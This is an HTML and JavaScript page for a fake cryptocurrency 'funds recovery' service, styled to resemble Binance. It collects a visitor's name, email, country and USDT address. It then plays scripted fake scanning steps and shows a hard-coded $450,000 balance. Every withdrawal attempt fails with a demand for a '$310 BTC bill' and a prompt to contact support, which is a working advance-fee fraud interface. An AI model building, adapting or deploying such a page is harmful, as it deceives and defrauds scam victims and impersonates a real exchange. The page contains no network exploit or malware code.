<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>#Funds Recovery</title>
  <link href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap" rel="stylesheet">
  <style>
    :root {
      --binance-yellow: #f0b90b;
      --binance-black: #181a20;
      --binance-blue: #1e2633;
      --binance-gray: #262a33;
      --success: #00ffcc;
      --danger: #ff5252;
      --input-bg: #23272f;
      --modal-bg: #101217d9;
    }
    body {
      margin: 0;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
      background: var(--binance-black);
      color: #fff;
      min-height: 100vh;
      letter-spacing: 0.01em;
    }
    .container {
      max-width: 410px;
      margin: 60px auto;
      padding: 28px 26px 22px;
      background: var(--binance-blue);
      border-radius: 14px;
      box-shadow: 0 0 18px 2px #0003;
    }
    h2 {
      text-align: center;
      font-weight: 700;
      color: var(--binance-yellow);
      letter-spacing: 0.01em;
      margin-bottom: 0.7em;
    }
    input, select, button {
      width: 100%;
      padding: 13px 15px;
      margin: 11px 0;
      border: none;
      border-radius: 7px;
      font-size: 1em;
      font-family: inherit;
      outline: none;
      box-sizing: border-box;
      transition: background 0.2s;
    }
    input, select {
      background: var(--input-bg);
      color: #fff;
    }
    button {
      background: var(--binance-yellow);
      color: #111;
      font-weight: 700;
      letter-spacing: 0.02em;
      cursor: pointer;
      transition: background 0.18s;
    }
    button:disabled {
      background: #999;
      cursor: not-allowed;
    }
    .hidden {
      display: none !important;
    }
    .center {
      text-align: center;
    }
    .activity {
      margin: 18px 0 8px;
      font-size: 1.13em;
      text-align: center;
    }
    .scan-step {
      margin: 10px 0;
      padding: 12px;
      background: var(--input-bg);
      border-radius: 6px;
      font-size: 0.98em;
      color: #f3f3f3;
    }
    .success {
      color: var(--success);
      font-weight: bold;
      text-align: center;
      margin-top: 18px;
      font-size: 1.15em;
    }
    .btn-main {
      background: var(--binance-yellow);
      color: #181a20;
      font-weight: 700;
      border-radius: 8px;
      margin-top: 20px;
      padding: 13px;
      font-size: 1.07em;
      box-shadow: 0 1px 3px #0002;
      transition: background 0.18s;
    }
    .btn-main:hover:not([disabled]) {
      background: #ffd700;
    }
    /* Dashboard Section */
    .holdings-card {
      background: var(--input-bg);
      border-radius: 10px;
      padding: 32px 18px 20px;
      box-shadow: 0 2px 24px #0002;
      text-align: center;
      margin-top: 20px;
      margin-bottom: 17px;
    }
    .holdings-title {
      font-size: 1.1em;
      color: #bbb;
      margin-bottom: 0.45em;
      font-weight: 500;
    }
    .holdings-amount {
      font-size: 2.1em;
      color: var(--binance-yellow);
      font-weight: 700;
      margin-bottom: 0.2em;
      letter-spacing: 0.03em;
    }
    .withdraw-btn {
      width: 100%;
      padding: 14px;
      background: var(--binance-yellow);
      color: #181a20;
      font-weight: 700;
      border: none;
      border-radius: 8px;
      font-size: 1.03em;
      margin-top: 18px;
      cursor: pointer;
      outline: none;
      transition: background 0.18s;
    }
    .withdraw-btn:hover { background: #ffd700; }
    /* Modal */
    .modal-bg {
      position: fixed;
      z-index: 80;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: var(--modal-bg);
      display: flex; align-items: center; justify-content: center;
      transition: opacity 0.28s;
    }
    .modal {
      background: var(--binance-blue);
      padding: 26px 19px 18px;
      border-radius: 14px;
      min-width: 320px;
      max-width: 92vw;
      box-shadow: 0 5px 32px #0005;
      position: relative;
      text-align: left;
    }
    .modal .close {
      position: absolute; top: 12px; right: 15px;
      font-size: 1.5em; color: #bbb; cursor: pointer;
    }
    .modal h3 {
      margin: 0 0 13px;
      color: var(--binance-yellow);
      font-size: 1.15em;
      font-weight: 700;
      text-align: center;
    }
    .modal label {
      font-size: 1em;
      color: #eee;
      margin-bottom: 3px;
      display: block;
      margin-top: 10px;
    }
    .modal select, .modal input {
      margin: 7px 0 15px;
      font-size: 1.06em;
      padding: 12px;
    }
    .modal .max-amount {
      background: none;
      border: none;
      color: var(--binance-yellow);
      font-weight: 600;
      cursor: pointer;
      float: right;
      font-size: 0.97em;
      margin-top: -38px;
    }
    .modal .modal-actions {
      display: flex;
      gap: 12px;
      margin-top: 10px;
    }
    .modal .modal-actions button {
      flex: 1;
      border-radius: 8px;
      font-size: 1.07em;
      padding: 12px 0;
      font-weight: 600;
    }
    .modal .loader {
      margin: 20px auto 10px;
      border: 4px solid #2228;
      border-radius: 50%;
      border-top: 4px solid var(--binance-yellow);
      width: 48px;
      height: 48px;
      animation: spin 1s linear infinite;
      display: block;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .modal .error-bill {
      background: #230808e6;
      color: var(--danger);
      border: 1px solid #d22;
      padding: 16px 10px;
      text-align: center;
      border-radius: 8px;
      margin-top: 18px;
      font-weight: 700;
      font-size: 1.07em;
      box-shadow: 0 2px 10px #d222;
    }
    /* Responsive */
    @media (max-width: 500px) {
      .container { margin: 30px 6px; padding: 18px 7px 14px;}
      .modal { min-width: 95vw; }
      .holdings-card { padding: 26px 6px 14px; }
    }
  </style>
</head>
<body>
  <!-- Registration -->
  <div class="container" id="registration">
    <h2>Recovery Registration</h2>
    <select id="country">
      <option value="">Select Country</option>
      <option value="USA">USA</option>
      <option value="UK">UK</option>
      <option value="Nigeria">Nigeria</option>
    </select>
    <input type="text" id="name" placeholder="Full Name" autocomplete="name"/>
    <input type="text" id="usdt" placeholder="USDT Address" autocomplete="off"/>
    <input type="email" id="email" placeholder="Email Address" autocomplete="email"/>
    <button class="btn-main" onclick="register()">Submit</button>
  </div>

  <!-- Recovery Steps -->
  <div class="container hidden" id="recoverySteps">
    <h2>Recovery Progress</h2>
    <div class="activity" id="greeting"></div>
    <div id="scanSteps"></div>
    <div id="finalMessage" class="success hidden">ðŸŽ‰ RECOVERY COMPLETED</div>
    <button class="btn-main hidden" id="enterDashboardBtn" onclick="showDashboard()">Enter Dashboard</button>
  </div>

  <!-- Dashboard -->
  <div class="container hidden" id="dashboard">
    <h2>Dashboard</h2>
    <div class="holdings-card">
      <div class="holdings-title">Current Holdings</div>
      <div class="holdings-amount" id="holdingsAmount">$450,000</div>
    </div>
    <div class="center" id="dashboardWelcome"></div>
    <button class="withdraw-btn" onclick="openWithdrawModal()">Withdraw</button>
  </div>

  <!-- Withdraw Modal -->
  <div id="withdrawModal" class="modal-bg hidden">
    <div class="modal">
      <span class="close" onclick="closeWithdrawModal()">&times;</span>
      <h3>Withdraw Crypto</h3>
      <label for="cryptoSelect">Cryptocurrency</label>
      <select id="cryptoSelect">
        <option value="BTC">Bitcoin (BTC)</option>
        <option value="ETH">Ethereum (ETH)</option>
        <option value="USDT">Tether (USDT)</option>
        <option value="LTC">Litecoin (LTC)</option>
        <option value="BNB">Binance Coin (BNB)</option>
        <option value="SOL">Solana (SOL)</option>
      </select>
      <label for="withdrawAddress">Destination Address</label>
      <input type="text" id="withdrawAddress" placeholder="Enter address"/>
      <label for="withdrawAmount">Amount</label>
      <input type="text" id="withdrawAmount" value="450000" readonly/>
      <button type="button" class="max-amount" onclick="setMaxAmount()">Max</button>
      <div class="modal-actions">
        <button class="btn-main" onclick="confirmWithdraw()" id="confirmWithdrawBtn">Confirm Withdraw</button>
        <button onclick="closeWithdrawModal()" style="background:#23272f; color:#fff;">Cancel</button>
      </div>
      <div id="withdrawLoader" class="loader hidden"></div>
      <div id="withdrawError" class="error-bill hidden">
        Withdrawal failed: <br>
        <strong>Recovery Refund Policy</strong><br>
        Due to security standards, a <span style="color:var(--binance-yellow);">$310 BTC</span> bill is required prior to withdrawal.<br>
        Please contact support for details.
      </div>
    </div>
  </div>

  <script>
    // Elements
    const registrationDiv = document.getElementById('registration');
    const recoveryStepsDiv = document.getElementById('recoverySteps');
    const dashboardDiv = document.getElementById('dashboard');
    const greeting = document.getElementById('greeting');
    const scanSteps = document.getElementById('scanSteps');
    const finalMessage = document.getElementById('finalMessage');
    const enterDashboardBtn = document.getElementById('enterDashboardBtn');
    const dashboardWelcome = document.getElementById('dashboardWelcome');
    const holdingsAmount = document.getElementById('holdingsAmount');

    // Withdraw Modal
    const withdrawModal = document.getElementById('withdrawModal');
    const withdrawAddress = document.getElementById('withdrawAddress');
    const withdrawAmount = document.getElementById('withdrawAmount');
    const withdrawLoader = document.getElementById('withdrawLoader');
    const withdrawError = document.getElementById('withdrawError');
    const confirmWithdrawBtn = document.getElementById('confirmWithdrawBtn');

    // Recovery Steps
    const steps = [
      "â€¢ Checking past activities...",
      "â€¢ Generating lost funds...",
      "â€¢ Loading database...",
      "â€¢ Refreshing new info...",
      "â€¢ Posting user profile to Blockchain...",
      "â€¢ Selecting crypto for payout...",
      "â€¢ BITCOIN SELECTED âœ…",
      "â€¢ Completing scanning details...",
      "â€¢ Completing user recovery..."
    ];

    let username = "";

    // Session check
    if (localStorage.getItem('registered')) {
      username = localStorage.getItem('name');
      showRecoverySteps();
    }

    // Registration
    function register() {
      const country = document.getElementById('country').value.trim();
      username = document.getElementById('name').value.trim();
      const usdt = document.getElementById('usdt').value.trim();
      const email = document.getElementById('email').value.trim();

      if (!country || !username || !usdt || !email) {
        alert("Please fill all fields.");
        return;
      }
      localStorage.setItem('registered', true);
      localStorage.setItem('name', username);
      showRecoverySteps();
    }

    function showRecoverySteps() {
      registrationDiv.classList.add('hidden');
      recoveryStepsDiv.classList.remove('hidden');
      greeting.textContent = `Dear ${username}, your recovery is in progress`;
      scanSteps.innerHTML = "";
      finalMessage.classList.add('hidden');
      enterDashboardBtn.classList.add('hidden');
      let index = 0;
      function nextStep() {
        if (index < steps.length) {
          const step = document.createElement('div');
          step.className = 'scan-step';
          step.textContent = steps[index];
          scanSteps.appendChild(step);
          index++;
          setTimeout(nextStep, 1000);
        } else {
          finalMessage.classList.remove('hidden');
          enterDashboardBtn.classList.remove('hidden');
        }
      }
      nextStep();
    }

    function showDashboard() {
      recoveryStepsDiv.classList.add('hidden');
      dashboardDiv.classList.remove('hidden');
      dashboardWelcome.textContent = `Welcome, ${username}!`;
    }

    // Withdraw Modal Logic
    function openWithdrawModal() {
      withdrawModal.classList.remove('hidden');
      withdrawAddress.value = '';
      withdrawAmount.value = '450000';
      withdrawLoader.classList.add('hidden');
      withdrawError.classList.add('hidden');
      confirmWithdrawBtn.disabled = false;
    }
    function closeWithdrawModal() {
      withdrawModal.classList.add('hidden');
      withdrawLoader.classList.add('hidden');
      withdrawError.classList.add('hidden');
      confirmWithdrawBtn.disabled = false;
    }
    function setMaxAmount() {
      withdrawAmount.value = '450000';
    }
    function confirmWithdraw() {
      const address = withdrawAddress.value.trim();
      if (!address) {
        withdrawAddress.focus();
        withdrawAddress.style.border = '1.5px solid var(--danger)';
        setTimeout(() => withdrawAddress.style.border = '', 1200);
        return;
      }
      confirmWithdrawBtn.disabled = true;
      withdrawLoader.classList.remove('hidden');
      withdrawError.classList.add('hidden');
      setTimeout(() => {
        withdrawLoader.classList.add('hidden');
        withdrawError.classList.remove('hidden');
        confirmWithdrawBtn.disabled = false;
      }, 6000);
    }

    // Modal close on background click
    withdrawModal.addEventListener('click', function(e) {
      if (e.target === withdrawModal) closeWithdrawModal();
    });
    // Enter key submits withdraw
    withdrawAddress.addEventListener('keypress', function(e){
      if(e.key==="Enter") confirmWithdraw();
    });
  </script>
</body>
</html>
